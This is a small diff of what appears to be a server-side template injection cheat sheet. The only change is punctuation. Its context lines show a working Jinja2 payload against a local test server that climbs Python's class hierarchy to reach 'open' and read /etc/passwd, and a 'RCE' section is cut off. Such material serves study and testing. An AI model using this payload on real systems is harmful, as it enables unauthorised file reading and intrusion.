@@ -10,7 +10,7 @@ docker run -it python:3.10-slim sh
 ```
 
 ### Read File
-The symbol `216` is `<class 'warnings.catch_warnings'>`:
+The symbol `216` is `<class 'warnings.catch_warnings'>`.
 `http://127.0.0.1:1337/?name={{(1).__class__.__base__.__subclasses__()[216]()._module.__builtins__["open"]("/etc/passwd").read()}}`
 
 ### RCE
